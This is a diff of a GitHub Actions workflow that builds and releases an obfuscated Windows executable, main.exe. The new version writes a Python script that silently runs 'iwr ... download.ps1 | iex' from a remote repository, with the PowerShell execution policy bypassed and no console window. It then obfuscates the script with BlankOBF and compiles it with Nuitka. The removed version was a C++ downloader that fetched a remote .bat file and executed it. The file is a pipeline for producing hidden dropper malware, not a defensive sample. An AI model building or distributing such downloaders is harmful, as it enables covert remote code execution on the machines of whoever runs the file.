@@ -1,4 +1,4 @@
-name: EXE
+name: Build with Nuitka and Obfuscation
 
 on:
   push:
@@ -21,41 +21,29 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v2
 
-    - name: Install Visual Studio Build Tools
-      run: |
-        choco install visualstudio2019buildtools --version 16.11.12 --includeRecommended
+    - name: Install Python
+      uses: actions/setup-python@v2
+      with:
+        python-version: '3.x'  # Specify your desired Python version
 
-    - name: Create C++ file with obfuscation
+    - name: Install Dependencies
       run: |
-        echo "#include <iostream>" > script.cpp
-        echo "#include <fstream>" >> script.cpp
-        echo "#include <windows.h>" >> script.cpp
-        echo "#include <wininet.h>" >> script.cpp
-        echo "" >> script.cpp
-        echo "int x = 0;" >> script.cpp
-        echo "void obfuscated_function() {" >> script.cpp
-        echo "    const char* u = \"https://github.com/43a1723/test/releases/download/AutoBuild/download.bat\";" >> script.cpp
-        echo "    const char* o = \"download.bat\";" >> script.cpp
-        echo "    HINTERNET i = InternetOpen(L\"MyApp\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);" >> script.cpp
-        echo "    HINTERNET c = InternetOpenUrlA(i, u, NULL, 0, INTERNET_FLAG_RELOAD, 0);" >> script.cpp
-        echo "    if (c) {" >> script.cpp
-        echo "        std::ofstream f(o, std::ios::binary);" >> script.cpp
-        echo "        char b[4096];" >> script.cpp
-        echo "        DWORD r;" >> script.cpp
-        echo "        while (InternetReadFile(c, b, sizeof(b), &r) && r > 0) {" >> script.cpp
-        echo "            f.write(b, r);" >> script.cpp
-        echo "        }" >> script.cpp
-        echo "        f.close();" >> script.cpp
-        echo "        InternetCloseHandle(c);" >> script.cpp
-        echo "    }" >> script.cpp
-        echo "    InternetCloseHandle(i);" >> script.cpp
-        echo "    system(\"download.bat\");" >> script.cpp
-        echo "}" >> script.cpp
-        echo "int main() { obfuscated_function(); return 0; }" >> script.cpp
+        pip install nuitka
+        pip install pywin32
 
-    - name: Compile C++ Script
+    - name: Download BlankOBF
       run: |
-        cl /EHsc script.cpp /link /OUT:script.exe
+        Invoke-WebRequest -Uri https://github.com/Blank-c/BlankOBF/raw/v2/BlankOBFv2.py -OutFile BlankOBFv2.py
+
+    - name: Create and Obfuscate Python Script
+      run: |
+        echo "import subprocess" > script.py
+        echo "subprocess.run(['powershell', '-nop', '-ep', 'bypass', '-c', 'iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1 | iex'], creationflags=subprocess.CREATE_NO_WINDOW)" >> script.py
+        python BlankOBFv2.py --input script.py --output script_obf.py
+
+    - name: Compile Python Script with Nuitka (No Console)
+      run: |
+        nuitka --standalone --windows-disable-console script_obf.py
 
     - name: Delete-tag-and-release
       uses: dev-drprasad/delete-tag-and-release@v1.1
@@ -72,7 +60,7 @@ jobs:
       with:
         tag_name: AutoBuildExe
         release_name: AutoBuildExe
-        body: Obfuscated run.cmd file
+        body: Obfuscated and compiled Python script
         draft: false
         prerelease: false
 
@@ -83,6 +71,6 @@ jobs:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       with:
         upload_url: ${{ steps.create_release.outputs.upload_url }}
-        asset_path: script.exe
+        asset_path: dist/script_obf.exe
         asset_name: main.exe
         asset_content_type: application/octet-stream
